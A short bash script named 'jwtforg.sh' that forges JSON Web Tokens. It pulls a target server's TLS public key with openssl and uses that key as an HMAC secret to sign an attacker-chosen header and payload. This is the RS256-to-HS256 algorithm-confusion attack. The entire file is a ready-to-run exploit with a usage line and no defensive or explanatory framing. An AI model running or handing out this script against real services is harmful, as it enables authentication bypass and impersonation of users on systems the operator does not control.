#!/bin/bash

# Creating  new jwt token 
if [ -z "$1" ] 
then
    echo "Usage : ./jwtforg.sh <hostname> <header and payload in jwt form>"
    exit
fi
openssl s_client -connect $1:443 > cert.pem
openssl x509 -in cert.pem -pubkey -noout > publickey.pem
cat publickey.pem | xxd -p | tr -d "\\n" > ascii
echo -n "$2" | openssl dgst -sha256 -mac HMAC -macopt hexkey:$(cat ascii) > ascii_signature
cat ascii_signature | awk '{print $2}' > ascii_signature2
python2 -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('$(cat ascii_signature2)')).replace('=','')\")" > jwt_signature
signature=$(cat jwt_signature)
echo "[*] Jwt token : $2.$signature"

rm -rf ascii ascii_signature ascii_signature2
